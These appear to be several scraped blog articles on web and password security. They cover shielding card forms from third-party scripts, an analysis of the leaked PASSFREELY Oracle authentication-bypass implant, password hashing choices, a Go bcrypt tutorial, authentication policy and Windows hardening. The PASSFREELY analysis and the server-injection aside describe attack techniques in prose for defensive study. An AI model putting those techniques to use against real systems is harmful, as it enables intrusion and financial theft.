So … that’s the mindset that I suggest we all adopt: sensitive information and third-party code should not be left alone together.
The site in this example has a credit card form that’s vulnerable to malicious third-party code, just like the ones on several very large ecommerce sites that you probably thought were better at security.
This page is teeming with third-party code. It uses React, and was created with Create React App, so it had 886 npm packages before I even got started (seriously).
It’s also got Google Tag Manager (if you don’t know, GTM is a handy way for people you’ve never met to inject JavaScript into your site without the hindrance of a code review).
And for good measure I’ve also got a banner ad (out of shot). This is an ad on the internet, so naturally requires 1.5 MB of JavaScript spread over 112 network requests and 11 seconds at full tilt on the CPU to load a single animated gif of a credit card riding a horse.
(Side rant: I am disappointed in Google for this. Their developer advocates spend a lot of time teaching us how to make the web fast; shaving off a few dozen kilobytes here and some milliseconds there — this is awesome stuff. But at the same time they allow their DFP ad network to send megabytes to a user’s device, making hundreds of network requests and sitting on the CPU for entire seconds. Google, I know you have the right brains to come up with a smarter, faster way to deliver ads. Why are you not?)
OK, getting back to the topic at hand… Obviously, what I need to do is prise my users’ sensitive information from the grubby hands of all that third-party code; I want that form to be on its own little island.
Now that we’re, like, two fifths of the way through this post, I’ll start to actually describe some approaches.
The simplest thing to do would be to have a whole new page with no JavaScript on it. When the user clicks ‘buy’, rather than show them some slick form incorporated into the current page, I’ll send them off to something like this:
Unfortunately, because the header, footer and navigation of my site are all React components, I can’t use them on this very vanilla page. So the ‘header’ you see is a manual replication of my full header without all the usual functionality. It’s a blue rectangle.
When the user has filled in that form (filled out that form? — why are opposites the same!?), they will click submit, and be redirected to the next step in the checkout flow. This might require some back-end changes to keep track of the user and the data they’ve submitted as they move across pages.
To keep this file nice and slim, I’ve used native form validation instead of JavaScript — support is 97%, and the required and pattern attributes get me a long way towards the experience I’d get with a full-blown JavaScript validation implementation.
Here’s a pen with some no-js regex validation and conditional styling if you want to see it in action. (The limitations are small but glaring.)
I would suggest that if you’re going to do this, keep it all in a single file.
Complexity is the enemy here (more so than ever). The HTML file for the above example — with CSS embedded in a <style> tag — is about 100 lines all up; since it’s so small and makes no network requests, it is near-impossible to meddle with undetected.
Unfortunately, this approach requires duplicating CSS. I have thought about this a great deal and looked at several approaches. All of them required more code than the amount of duplicated code they aimed to prevent.
So, I would suggest that while the mantra of “Don’t Repeat Yourself” is excellent guidance, it should not be seen as an absolute, unbreakable rule that must be adhered to at all costs. In some rare cases, like the one described here, repetition of code is the lesser of two evils.
The most useful rules are those you know when to break.
(My new year’s resolution is to try and sound more profound without actually saying anything of substance.)
The first option is OK, but it’s a step down from a UI and UX perspective, and the point at which you’re taking someone’s money is about the last place you want to introduce journey-friction.
Option 2 fixes this by taking the form and serving it in an iframe.
You might be tempted to do something like this:
In that example, the parent page and the contents of the iframe can still see and interact with each other freely. This would be like leaving a doberman in one room, hamster in another, with a door between them that the doberman can simply push open when it gets peckish.
What I need to do is ‘sandbox’ that iframe. Which (I just learned) has nothing to do with the sandbox attribute of an iframe, since that’s about protecting the parent page from the iframe. I want to protect the contents of the iframe from the parent page.
As luck would have it, browsers have a built-in distrust of things that come from different origins. It’s called the same-origin policy [insert edgy political commentary here].
Because of this, simply loading the frame from a different domain is enough to prevent communication between the two.
If you’re wondering about the accessibility of content in an iframe, a) good for you, and b) wonder no longer. According to WebAIM: “There are no distinct accessibility issues with inline frames. The content of the inline frame is read at the point it is encountered (based on markup order) as if it were content within the parent page.”
Let’s think about what happens once the form is filled in. The user will hit the submit button in the form in the iframe, and I want that to navigate the parent page. But if they’re on different origins, is this even possible?
Ya, that’s what the target attribute of a form is for:
So, the user can type their sensitive information into a form that fits in seamlessly with the surrounding page. Then, when they submit, the top level page is redirected in response to the form submission.
Option 2 is a huge increase in security — I no longer have a sitting-duck credit card form. But it’s still a step back in usability.
The ideal solution wouldn’t require any full page redirects…
In my example site I actually want to keep the credit card data in state, along with the details of the product being purchased, and submit all that info in one AJAX-style request.
This is blindingly easy. I’ll use postMessage to send the data from the form up to the parent page.
This is the page being served in the iframe…
…and in the parent page (or more specifically, in the React component that requested the iframe in the first place), I just listen for messages from the iframe and update the state accordingly:
If I was feeling frisky, I could instead send data up from the form to the parent in an onchange event for each input individually.
While I’m frisking, there’s nothing stopping the parent page from doing some validation and sending the validity state back down to the plain-Jane form. This allows me to reuse any validation logic that I may have elsewhere in my site.
[Edit: two clever people in the comments have suggested that the iFrame could submit the data, without redirecting the parent page, then communicate the success/failure state back to the parent page using postMessage. This way, no data is ever sent to the parent page.]
So, that’s it! Your user’s sensitive information is safely entered into an iframe on a different origin, hidden from the parent page, but the data captured can still be a part of the state of your app, meaning no changes are required to the user experience.
At this point, you might be thinking that sending the credit card data up into the parent page defeats the whole purpose. Isn’t it then accessible to any malicious code?
There are two parts to this answer, and I can’t think of a simple way to explain it. Sorry.
The reason I think this is a reasonable risk to take is easier to understand from the perspective of the hacker. Imagine it’s your job to come up with some malicious code that can run on any website, seeking out sensitive information and sending it off to a server somewhere. Every time you send something, you run the risk of being caught. So it’s in your best interest to only send data that you are certain is valuable.
If this was my job I would not be indiscriminately listening to message events and sending off the data I find in them. Not when thousands of sites have perfectly vulnerable credit card forms with neatly labelled inputs.
The second part to the answer is that if the malicious code you’re worried about isn’t just some generic code, it might know to listen to that message event on your site and pluck the credit card numbers out. This idea of protecting against code that was written specifically for your site deserves its own section…
So far I have described attacks using generic malicious code. That is, code that doesn’t know what website it’s running on, it just looks for, gathers and sends sensitive information to the villain’s evil lair in the basement of a volcano.
Targeted malicious code, on the other hand, is code written to tango with your site specifically. It is crafted by a skilled developer who has spent weeks familiarising themselves with every nook and cranny of your DOM.
If your site has been infected with targeted malicious code, you’re screwed. No two ways about it. You might have put everything in a perfectly secure iframe, but the malicious code will just remove the iframe and replace it with a form. An attacker could even change the prices displayed on your site, maybe offer 50% off and tell users they need to re-enter their credit card details if they want the goods. You are well and truly owned.
If you’ve got targeted malicious code on your site, you might as well bend over and pick up a flower and smell it — you know, focus on the positive things in life.
This is why it’s so insanely important to have a content security policy. Otherwise an attacker can mass-distribute generic malicious code (say, via an npm package) that can ‘upgrade’ to targeted code by sending a request to an evil server that returns a payload tailored to your site.
The attacker is free to update and add to their targeted code at their leisure.
You really must get yourself a CSP.
OK that was the long way of saying: using postMessage to send sensitive data from an iframe up to the parent only slightly increases your risk. Generic malicious code is not likely to see this, and targeted code will get your users’ credit card data no matter what you do.
(For the record, I wouldn’t use option 1, 2, or 3 on my own small site. I’d let the professionals handle my credit card data, and offer only sign-in with Google/Facebook/Twitter. Of course don’t follow this advice unless you’ve done the sums of revenue lost from users that won’t sign up with social vs the cost/risk of capturing and storing passwords securely.)
You might think that if you follow the advice above you’re safe and sound. Nope. I can think of four more places you could get into trouble, and I vow to keep this updated with the wisdom of the crowd.
I’ve now got a super-lightweight HTML file, ready to capture user input without being spied on. I just need to stick it somewhere so that it can be served from a separate domain.
Maybe I’ll just fire up a simple Node server somewhere. I’ll just add one little logging package…
OK, 204 is a lot, but you might be wondering how code running on a server that only serves files can endanger user data typed in the browser?
Well, the problem is that any code, from any npm package, that’s running on your server can do whatever it wants to any other code, including code handling network traffic.
Now, I’m just an impostor developer who is easily confused by four-letter words like this and call, but even I could work out how to inject a script into an outbound response and allow it to make requests to my evil domain by editing the CSP header.
When the injected script lands in the browser, it will load some (potentially targeted) malicious JavaScript from an evil server (which it can because the CSP says it’s OK), and then delete all traces of itself.
The gist above is not actually useful on its own (as eagle eyed readers will have noticed), and a real hacker probably wouldn’t go after Express like this. I’m just illustrating the point that your server is the wild wild west and anything that’s running down there has the potential to expose data that a user enters in their browser.
(If you’re a package author, you might consider using Object.freeze or Object.defineProperty with writable: false to lock down your stuff.)
In reality, it’s probably a bit far-fetched to think there are Node modules doing something this egregious with outbound requests — to me it seems like this would be too easy to detect.
But do you really want to go to all the trouble of creating a form that doesn’t contain any third-party code only to give third-party code the ability to modify it right before sending it to the user? That’s your call.
My suggestion is to serve these ‘secure’ files from a static file server, or don’t bother doing any of this.
Yes that heading is both the step we’re up to and the name of a vulnerability.
I’m a big fan of Firebase for static hosting because it’s about as fast as you can get, and deployments are dead easy.
Just install the firebase-tools from npm and… oh no, I’m using an npm package to avoid npm packages.
OK, deep breath David, maybe it’s one of those beautiful zero-dependency packages.
Installing … installing …
Jezus Kanye, 640 packages!
OK I give up on making recommendations, you’re on your own. Just get your HTML files onto a server somehow. At some point we all need to trust code written by strangers.
Fun fact: it’s taken me a few weeks to write this post. I’m in a final draft and I just installed the Firebase tools again to check I got that number right…
I wonder what those seven new packages do? I wonder if the people that manage the Firebase tools wonder what those seven new packages do? I wonder if anyone knows what all the packages their package requires do?
You may have noticed that I haven’t suggested that you incorporate your ‘secure’ HTML files in your build pipeline (for example, to share CSS), even though that would solve the duplication-of-code problem.
This is because any of the hundreds of packages involved in even the simplest Webpack build can potentially modify the output of the build process. Webpack on its own requires 367 packages. Something benign like a css-loader will add 246 more. The excellent html-webpack-plugin you might use to put the right CSS file name in your index file will add 156 packages on top of that.
Again, I think it’s highly unlikely that any of these will be injecting scripts into your minified output. But still, it seems wrong to go to so much effort to produce a pristine, tiny, hand-written, human-readable hamster-friendly HTML file only to process it with several hundred dobermans right before bedtime.
The last thing to protect against is the most dangerous of all. Something that has access to modify any code you’ve written and take down any security barriers you have put up: the new kid that starts 6 months from now and doesn’t know what they’re doing.
This is actually one of the trickiest things to protect against. The only solution I can think of is a ‘unit test’ of sorts that ensures there’s no external scripts in any of these ‘secure’ files.
I’m allowing <script> tags with no source (so, inline code), but blocking script tags with a src attribute. I set jsdom to execute scripts so I can catch if someone is creating a new script element with a document.createElement().
At least this way, the new kid would actually need to modify a unit test to add a script, and with any luck that would wake up a code reviewer enough to question the move.
It’s also a good idea to run checks of this nature on the published secure HTML file. You could then be more comfortable using things like Firebase tools and Webpack, knowing that alarm bells will sound in the extremely unlikely event that one of those 1,200 packages edits your output.
Before I go, I want to address a sentiment I’ve heard quite a lot over the past few weeks — the suggestion that developers should use fewer npm packages.
I understand the emotional drive behind this: packages can be bad, less packages must be less bad.
But it’s a bad suggestion; if the security of your user’s data relies on you using fewer npm packages, your security isn’t any good.
It’s like leaving your hamster alone with fewer dobermans.
If I was starting a new project tomorrow, creating a site that handled highly sensitive information, I would use my preferred tools of React and Webpack and Babel and friends, just like I would have a month ago.
I don’t care if there’s a thousand packages, or that they will constantly be changing, or that I will never know for sure if one of them contains malicious code.
None of that matters to me because I’m not going to leave any of them alone in a room with Professor Baggy Pants.
Hey, thanks for reading! As always, security is a team sport; if I’ve said something dumb or given bad advice, let me know and I’ll fix it. If you’ve got a nice idea, let me know and I’ll add it and pretend it was mine.
Have a tops day!
Written by
","['About', 'Help', 'Go Home', 'JavaScript', 'JavaScript', 'Web Development', 'Cybersecurity', 'Programming', 'Software Development']"
PASSFREELY: Oracle & SWIFT at risk - Comae Technologies,https://blog.comae.io/passfreely-oracle-swift-at-risk-eb6886908227?source=tag_archive---------9-----------------------,"On 14 April, the mysterious group ShadowBrokers released an archive containing several exploits, tools and operational notes on one of the most complex cyber-attack in History: JEEPFLEA.
Among those tools Windows exploits but also tools, to compromise SWIFT Service Alliance servers. One of this tool, PASSFREELY, enable the bypass of the authentication process of Oracle Database servers, and the second ones, initial_oracle_exploit.sqI & swift_msg_queries_all.sql, are Oracle Database scripts to backup the entire transactions stored in the Oracle databases as explained in last week’s post, all the Oracle administrators accounts including their credentials — and also internal undocumented structures on the schema tables of the SWIFT Messaging tables.
PASSFREELY forces a compromised (with DOUBLEPULSAR) Oracle Database server to accept every incoming connection. It disables the authentication requirements directly by modifying the Oracle Database application in the server’s memory. Oracle databases are one of the most popular enterprise database systems in the world, used by everything from Airlines to Telecoms. They also happen to be used by the international bank messaging system, SWIFT, to store financial transactions.
PASSFREELY is an Oracle Database server implant to allow ANY connections to the Oracle Database, by altering the authentication procedures for 386 versions of Oracle.
The implant looks for the ORACLE{xx}.EXEprocess in memory before patching the authentication function to allow any connections.
According to the strings contained in the implant, 386 versions (Oracle 7.2 -> 11.2 — see Appendix A for detailed list) of Oracle Database are affected by this four-year-old version of PASSFREELY — and after analysis, 2635 code mutations are stored which means each bypass requires an average of 7 code modifications per Oracle Database target.
Each of those code mutation aims at changing the code logic by either changing the direction of an jnz into a, jmp, or replacing it with nopinstruction in the ORACLE.exe executable loaded in memory, to directly alter the authentication logic.
Changing a logical branch (jnz -> jmp), or replacing it with nops — means you either nullify a check or force it to go a specific operation, regardless if the initially evaluated statement is true or not.
This is not an innovative technique, this has been used in the cracking scene since the 90s, and even last year BAE Systems reported a two bytes patch via the 525a8e3ae4e3df8c9c61f2a49e38541d196e9228 malware which infected the SWIFT Alliance softwares (vialiboradb.dll) during the Bank of Bangladesh’s heist.
Most of strings used for debugging strings are also still present, although unlike ETERNALSYNERGY, they are encoded and are then decoded by the following algorithm:
This utility represents a threat for any Oracle customer including SWIFT Service Bureau but also Banks using SWIFT Alliance. Even though until now, SWIFT always rejected responsibility of any SWIFT related hack, the release of this utility in the wild represent a serious and real threats to them and their customers which they can’t ignore.
There has been multiple kernel mitigation introduced by Microsoft since Windows Vista to prevent patching of userland processes by other userland processes. Protected Process are not a novelty per say, but very few vendors actually implement them — initially created for DRM purposes they prevent regular process to read or write the memory of a protected process.
Code Integrity checks are crucial too.
Although this does not prevent kernel mode drivers to access the virtual memory of a process — this would at least stop trivial code memory modifications like we saw during the Bangladesh Bank’s heist or with this newly available PASSFREELY tool to unfriendly attackers.
Written by
","['Products', 'Labs', 'Events', 'Hire Comae', 'Security', 'Cybersecurity', 'Comae Labs', 'Shadowbrokers', 'Snowden']"
"Password Hashing: Scrypt, Bcrypt and ARGON2 - Michele Preziuso - Medium",https://medium.com/@mpreziuso/password-hashing-pbkdf2-scrypt-bcrypt-and-argon2-e25aaf41598e?source=tag_archive---------4-----------------------,"There’s always a lot of debate in regards to how to safely store passwords and what algorithm to use: MD5, SHA1, SHA256, PBKDF2, Bcrypt, Scrypt, Argon2, plaintext??
So I tried to analyse and summarise the most recent and reasonable choices: Scrypt, Bcrypt and Argon2. …and yes, MD5, SHA1, SHA256 are not suitable for storing passwords! �
In 2015, I’ve published ‘Password Hashing: PBKDF2, Scrypt, Bcrypt’ intended as an extended reply to a friend’s question.
Summarily saying that:
Attackers have usually different and more specialised (powerful) hardware than ours;
Attackers use specialized hardware because it can be tailored to the algorithm, the different hardware architecture allows certain algorithm to run faster than on non-specialised hardware (CPU) and - overall - certain algorithms can be parallelised;
We rely on slow-hashing functions to hash passwords in order to fight the attacker on equal grounds: your power unit (CPU/GPU) against his GPU/FPGA/ASIC
All of the above is still true, however the race to cryptocurrencies added another facet to it: with multi-billion dollar market caps, the fastest software/hardware implementation of the underlying crypto algorithm of a cryptocurrency is also the one with an advantage against other miners and thus the most profitable one.
Whilst Bitcoin uses SHA256 as the underlying crypto function (which can therefore be greatly optimised on optimised hardware making it an ‘unfair’ coin for miners) other creators have tried to make new cryptocurrencies more fair to mine by relying on memory-hard: Litecoin (Scrypt) as an early example and Zcash (Equihash) as a more recent one.
This means that the same slow-functions that are used for password hashing are being used to protect millions or even billions of dollars in cryptocurrencies, making the building of the fastest implementation of the slow hashing function even more rewarding and usually publicly available!
The principle is still the same: we need a slow function that’s been vetted by the crypto community and remains unbroken.
PBKDF2 has been out there for a long time and hasn’t aged very well as discussed in the previous article: easily parallelised on multi-core systems (GPUs) and trivial for tailored systems (FPGAs/ASICs). So it’s a No from me.
BCrypt has been out there since 1999 and does a better job at being GPU/ASIC resistant than PBKDF2 but I wouldn’t recommend it for new systems as it doesn’t shine in a threat model with offline cracking.While some cryptocurrencies rely on it (i.e. NUD), it hasn’t gained a lot of popularity and - consequentially - enough interest from the FPGA/ASIC community to build a hardware implementation of it.That being said, Solar Designer (OpenWall), Malvoni and Knezovic (University of Zagreb) have written a paper in 2014 describing a hybrid a system of ARM/FPGA SOCs to attack the algorithm.
SCrypt is a better choice today: better design than BCrypt (especially in regards to memory hardness) and has been in the field for 10 years.On the other hand, it has been used for many cryptocurrencies and we have a few hardware (both FPGA and ASIC) implementation of it.Even though they’re specifically for mining they can be repurposed for cracking.
Shortly after writing my initial article, Argon2 won the PHC in July 2015.
The competition was initiated in fall 2012, in Q1 2013 the board published a call for submissions and the deadline was end of March 2014. As part of the competition, the panelists thoroughly reviewed the submissions and published an initial short report where they describe their selection criteria and rationale.
There are two main versions of Argon2: Argon2i which is the safest option against side-channel attacks and Argon2d which is the safest option against GPU cracking attacks.
Source code is available on GitHub, written in C89-compliant C, licensed under CC0 and compiles on most ARM, x86 and x64 architectures.
Argon2 is based on AES which modern x64 and ARM processors implement in their instruction set extensions, thus greatly closing the performance gap between common systems and the attackers’.
Both versions of the algorithm can be parameterised by:
this means that you can separately tune these parameters and tailor the security bound to your use case, threat model and hardware specifications.
On top of this, Argon2 is particularly resistant to ranking tradeoff attacks making it much more difficult to cheaply optimise on FPGAs: even though recent FPGAs have embedded RAM blocks, memory bandwidth is still a constrain and in order to reduce the memory bandwidth requirements, the attacker must use more computational resources with Argon2.
This and similar attacks are discussed in the specs (see chapter 5) as well as in a separate paper by the same authors where they also compare it with scrypt.
The below is a quote/paraphrase from the Argon2 IETF Draft.
Argon2d uses data-depending memory access, which makes it suitable for cryptocurrencies and PoW applications with no threats from side-channel timing attacks. Argon2i uses data-independent memory access, which is preferred for password hashing. Argon2id works as Argon2i for the first half of the first iteration over the memory and as Argon2d for the rest, thus providing both side-channel attack protection and bruteforce cost savings due to time-memory tradeoffs. Argon2i makes more passes over the memory to protect from tradeoff attacks.
If you fear side-channel attacks (i.e. Meltdown/Spectre which allow reading private memory of other processes running on the same hardware via cache-based side channels) you should use Argon2i, otherwise Argon2d.If you are unsure or if you’re comfortable with a hybrid approach you can use Argon2id to have the best of two worlds.
In 2019 I’d recommend not to use PBKDF2 or BCrypt in the future and highly recommend Argon2 (preferrably Argon2id) for newer systems.
Scrypt can be a second choice on systems where Argon2 is not available, but keep in mind that it has the same issues with respect to side-channel leakage.
Written by
","['Cryptography', 'Cryptocurrency', 'Programming', 'Passwords', 'Cybersecurity']"
Password Hash & Salt Using Golang - James Cox - Medium,https://medium.com/@jcox250/password-hash-salt-using-golang-b041dc94cb72?source=tag_archive---------5-----------------------,"The following is an example of how to hash & salt your passwords using the bcrypt package in Go.
For this example I’m going to make a console application for the purposes of demonstrating how to take a password entered by a user and generate a salted hash with it. Once we’ve done this, I’ll go through comparing a password with its hashed version to verify whether or not the password is correct.
We’ll start by creating the following function which can be used to read user input from the console.
Now that we have the users password we can hash & salt it using the GenerateFromPassword(password []byte, cost int)([]byte, error) function in Go’s bcrypt package.
GenerateFromPassword returns the bcrypt hash of the password at the given cost. If the cost given is less than MinCost, the cost will be set to DefaultCost, instead.
One advantage of using GenerateFromPassword is that it generates a salt for us which saves us from having to write our own function to generate a salt.
The below function uses GenerateFromPassword to generate a salted hash which is returned as a byte slice. We then return the byte slice as a string so that we can store the salted hash in our database as the users password.
So far we’ve created a function that accepts user input from the console and returns it as a byte slice. We then created a function that will take this user input and return a salted hash.
So, putting it altogether it should look something like this.
If you run the above code you‘re output should be similar to this.
Note, I called my functions inside an infinite for loop so as my program continues to run until I force it to stop. For those unfamiliar with Go it’s just like doing this while (true) { }. You don’t have to do this but I found it easier as it meant I could try out different passwords and see the results without having to run the program each time.
The last thing we need to do is verify a password matches its hash which is what we would need to do if we were building a login system. We can do this using the
CompareHashAndPassword(hashedPassword, password []byte) error
function provided by the bcrypt package.
CompareHashAndPassword compares a bcrypt hashed password with its possible plaintext equivalent. Returns nil on success, or an error on failure.
Using CompareHashAndPassword we can create a function that returns a boolean to let us know whether or not the passwords match.
We can now update our main function so that we will be able to enter a password, get its salted hash and then enter the password again and find out if our second password matches the first password we entered.
If you run the above code and enter the same password twice you should get the following result.
However, if you enter two passwords that don’t match then you should get the following result.
Altogether your code should look like this.
If you made it this far thanks for taking the time to read this tutorial and I welcome any improvements or alternative methods for storing passwords.
Written by
","['Golang', 'Programming', 'Cybersecurity', 'Software Development', 'Web Development']"
Password (IN)SANITY: Intelligent Password Policy & Best Practices,https://medium.com/@securitystreak/password-policy-template-2017-best-practices-cbdcbb6beb49?source=tag_archive---------6-----------------------,"Password policies need to evolve as we learn how humans use and abuse them. We all need to educate our family and friends and develop applications and services capable of change.
This article takes a fresh look at passwords, multi-factor authentication, and biometrics — outlining best practices and imminent threats our users face: so you can challenge bad practices.
Andrew Douma is a vendor-neutral IT Security Professional. He performs professional audits, penetration tests, and risk assessments. He designs secure networks and engineers high-assurance systems in the Cloud.
You can connect with him on GoodReads, LinkedIn, Medium, and Twitter.
Buying a professional penetration testing laptop| Evaluating QubesOS as a Penetration Testing Platform | Finding the right exploit code | Antivirus in 2017: Why? Which? How? | Penetration Testers’ Guide to Windows 10 Privacy & Security | Full Disk Encryption with VeraCrypt | Hacker to Security Pro! On the Shoulders of #InfoSec Giants | Securing an Android Phone or Tablet (LineageOS) | Security Architecture Patterns I & Patterns II
The combination of a username (often your email address) and password are regularly the sole means of authenticating your identity as a valid user — which in term dictates what you are authorized to do.
We forget that discovering valid usernames is half the battle for cyber criminals, why make it easy?
Discovering valid usernames is half the battle for an attacker; aided by large public datasets from past data breaches — or predictable (corporate) email address patterns, coupled with names harvested from LinkedIn.
Most security controls do not detect let alone block attacks against web applications and web browsers. An attacker with no prior knowledge can learn a lot by how a web application or service responds to his requests.
Whenever you log in, oftentimes an app checks your username first, if it finds a match, it will take the computational effort to hash the password, and compare it against the hash value stored in its database.
Though this may appear to be a sound strategy, it allows an attacker to enumerate valid/invalid usernames based on the time it takes to get a response. The extra database lookups and hashing make it apparent.
Even if the attacker has no success enumerating valid usernames via timing attacks, often subtle changes in the HTML body, HTTP response headers or the way Cookies are handled still give it away.
Thankfully, fewer developers give away even easier clues in error messages these days. Showing a different error message depending on if the user exists or whether it was an invalid password is a dead giveaway.
Even when the login process is designed with care, mobile APIs, registration forms, username/password recovery and change features are seldom fitted with the same protections.
Given time, between the lists of commonly used passwords and their human-preferred permutations, an attacker can expect to recover passwords for ~20% of users. Phishing the rest is made easy if usernames are email addresses.
It remains challenging to strike up the right balance between User Experience (Security UX) and application security (more on that later.)
You will find that logging into bank or investment accounts may involve additional steps, generally referred to as Multi-Factor Authentication (MFA).
Ideally, these steps revolve around a physical device providing one time passwords or cryptographic tokens — and not an out-of-band (OOB) email or text message!
Let’s look at an example:
The bank makes additional efforts to safeguard the supply-chain from device manufacturing to distributing it to clients. These devices are tamper resistant, wiping its chips when opened (yup, I have tried).
Software-based time-based one-time password (TOTP) emulator apps are in every App-store but can never offer the same level of assurance as hardware devices.
Using a FIDO/U2F compatible security token like the Yubikey 4 is the best way to secure your accounts online.
Conceptually sending an email or text is another sound strategy that provides a good user experience. However, if used for anything other than alerting you of important account activity, dangerous for several reasons:
In addition to each of these deal breakers:
The National Institute of Standards and Technology (NIST) has declared that OOB authentication methods should be retired in the recently completed SP 800–63 Digital Identity Guidelines.
Knowledge of your full name, phone number, and home address can unlock a world of hurt. Information like this is readily available by scouring Facebook events and often provided anywhere you have signed up.
The National Cybersecurity Center of Excellence (NCCoE) launched the MFA for E-Commerce project to demonstrate that contextual risk calculation, can increase assurance in purchaser identity.
Biometric sensors come built into today’s devices; such as my ThinkPad’s fingerprint reader and Touch ID-enabled iPhone.
In addition to fingerprints, other conventional biometrics include:
Biometrics can provide a great user experience, but they are not as secure as you may currently believe. The current generation of (affordable) sensors is relatively easy to bypass.
Latest developments:
Adobe has previously demonstrated their “Photoshop for Voice” technology, and the Samsung “Iris” Scanner can be tricked by a contact lens placed on a zoomed-in infrared photograph of yours.
Many fingerprint sensors are quickly bypassed using a thin film and some light pressure or by recreating a 3D printed stand-in based on a publicly available picture (damn those Megapixels!)
All while you and I leave them behind on every coffee mug we touch during our lunch break or with every voicemail we leave behind. Once a biometric is compromised, there is no option to rotate it — for some, we would not have to.
It needs to become known that a human fingerprint is not that unique, and any uniqueness observed will not guarantee that two individuals’ prints are always sufficiently different that they could not be confused.
There are also many legal considerations from crossing international borders to biometrics rarely being constitutionally protected. So stick with a 6+ digit PIN code for all mobile devices and adjust your settings to ‘require it immediately’ and ‘automatically erase all data’ after ten failed attempts (backups!)
Biometrics need to be tightly bound to a particular device that supports proper hardware-enabled crypto, similar to per-user X.509 certificates. Never to be used as the sole factor of identity verification, but as part of a multi-step authentication process backed up by something else.
If you spend money online you have a say in bringing about positive change and awareness:
If your bank lacks any second-factor authentication, or still sends secrets in a text, consider it a strong indicator of their overall security posture.
Let’s skip the frequently regurgitated and by now mostly depreciated advice on passwords strength and skip to the good stuff:
When that 3rd party website you signed up for three months ago is compromised, your email/username and password hash are sold, traded and eventually leaked onto the public internet for free.
Password managers help you generate, store and even input the best passphrase a website will accept. Think of them as the modern equivalent of writing down your passwords.
However, if the attacker obtains your ‘notebook,’ you are in big trouble. A Password Manager is a standard application that can be targeted by an attacker, just like Anti Malware solutions.
The usability vs. security tradeoff is still worth it.
Typically, an attacker will harvest any stored credentials, copy all Browser cookies to hijack any web sessions still valid, remove them from your cache and enable a keylogger to capture your username and password next time a website asks.
A password manager maintains an encrypted database to store everything. By copying the right files and capturing your master password with a keylogger, an attacker obtains access to every single username/password stored.
Keeping your devices up to date and hardening them remains relevant. It remains difficult to fully trust Android devices.
Before Password Managers became so ubiquitous, I developed my own strategy to thwart attackers:
This made it very difficult for attackers to guess my usernames, very easy to setup Inbox filters and also trace which websites sold (or “lost”) my information.
It works, but there is a tradeoff between security and usability.
As an avid Unix user, I use ‘pass’ (password store) which is a local GPG2 based solution with many clients, GUIs, and extensions. LessPass is another solution for tech-savvy users.
I have started steering people away from 1Password, due to their pushy marketing practices, and LastPass, due to their history of security fails. Sending them to SpiderOak’s Encryptr, Bitwarden or Enpass instead.
Some prefer a deterministic solution, but be wary of their inherent design flaws. With a hosted SaaS solution, you trade-in some privacy for usability.
You may be interested in Password Safe, which was designed by Bruce Schneier (encryption expert) and works with a YubiKey 4 on Windows. It can be found in most Linux software repositories, and there is a good clone for macOS/iOS that can be synced over iCloud or Dropbox.
Another favorite Password Manager is the cross-platform and open source KeePassXC, one of the many forks of KeePass for Windows.
Ultimately the choice is yours —determine your comfort level but above all start using one!
So how do we prevent the end-user, our family, and friends, from shooting themselves in the foot? What password policy works?
It is up to you, the UX designers, app developers, and sysadmins of this world to challenge existing password policies and create applications and services capable of change.
You need to understand how easy it is to create a convincing copy of your website and host it on an identical looking domain name with a trusted TLS certificate.
By training your users and deploying security headers like HSTS and X-XSS-Protection as well as DMARC you can thwart many attacks against you systems and client browsers.
Put technical defenses in place so that simpler password still provide an effective level of security:
The Open Web Application Security Project (OWASP) produces free methodologies and documentation to improve web application security.
A selection of recently updated cheat sheets:
Note that not all current OWASP recommendations are NIST SP 800–63 compliant or on par with my recommendations. Same applies to the testing guides referenced below.
Similarly, the golden standard for web application penetration testing is the OWASP Testing Guide, relevant sections include:
Get intimate with your application and APIs using Burp Suite, PappyProxy, and ZAP and get familiar with blocking brute-force/password grinding tools.
Click the ♡ to recommend this article.
Written by
","['Smartphone malware', 'Anywhere online', 'HIDS', 'DMARC reporting', 'implement XSS', 'CSRF protections', 'SSO libraries', 'OpenID', 'OAuth2', 'SCIM2', 'SAML', 'etcetera etcetera', 'Argon2id', 'Lyra2', 'PBKDF2', 'bcrypt', 'scrypt', 'sometimes help', 'Authentication', 'Cryptographic Storage', 'Forgot Password', 'Password Storage', 'SAML Security', 'Session Management', 'Passwords', 'Risk Management', 'Web Development', 'Cybersecurity', 'Password Management']"
Penetration Testers’ Guide to Windows 10 Privacy & Security,https://medium.com/hackernoon/the-2017-pentester-guide-to-windows-10-privacy-security-cf734c510b8d?source=tag_archive---------0-----------------------,"Safeguarding the privacy and security of myself and my clients’ data — while still allowing me to execute a penetration test is the goal.
Having concluded in September that Qubes OS was best suited as a portable lab, I have adopted Windows 10 Pro v1607 as my offensive platform. This article was modified in July ’17 to include several v1703 pitfalls.
Apply these hardening techniques to your personal Windows 10 system, drastically improving your security posture and keep your affairs private.
Andrew Douma is a vendor-neutral IT Security Professional. He performs professional audits, penetration tests, and risk assessments. He designs secure networks and engineers high-assurance systems in the Cloud.
You can connect with him on GoodReads, LinkedIn, Medium, and Twitter.
Buying a professional penetration testing laptop| Evaluating QubesOS as a Penetration Testing Platform | Finding the right exploit code | Antivirus in 2017: Why? Which? How? | Full Disk Encryption with VeraCrypt | Hacker to Security Pro! On the Shoulders of #InfoSec Giants | Securing an Android Phone or Tablet (LineageOS) | Password (IN)SANITY: Intelligent Password Policy & Best Practices | Security Architecture Patterns I & Patterns II
Microsoft has made much progress improving the security capabilities of their Operating System (OS). However, their pervasive use of “telemetry” and forcing software installation/upgrades, has cost them the trust of their customers.
Other hardware/software corporations are also installing telemetry software that calls home (Intel, Nvidia, Lenovo). Corporate surveillance is big business and here to stay.
On principle, I never want to see any persistent outbound UDP connections that I did not setup myself. I also do not want my network captures polluted.
So here we are: I trust neither my OS nor my hardware vendor. Welcome to my Windows 10 hardening guide.
A best practice is to format the hard drive and install legitimate and still supported software. Windows 10 Anniversary Edition (v1607), for better or worse!
Used systems with pre-loaded software may contain malware. It is not unheard of this being the case for a newly store-bought laptop. It only takes one tech savvy person in the supply chain.
If insist you do not have a Windows installation USB/CD, use a search engine to find any recovery options our vendor provides. Most will allow you to download a recovery image or order one free of charge. If possible, cryptographically verify that your installation image is authentic.
As cyber security professionals, let’s start treating this topic like Sex Ed:
Torrenting sites are designed to make money. Their UI/UX is often designed to trick people into installing malware — many host malicious ad campaigns that contain exploit kits with 0day drive-by exploits.
Pirated operating systems and (security) software found on torrent and other file sharing sites all contain malware. It is child’s play to fool your Antivirus. Attacks are becoming more and more destructive.
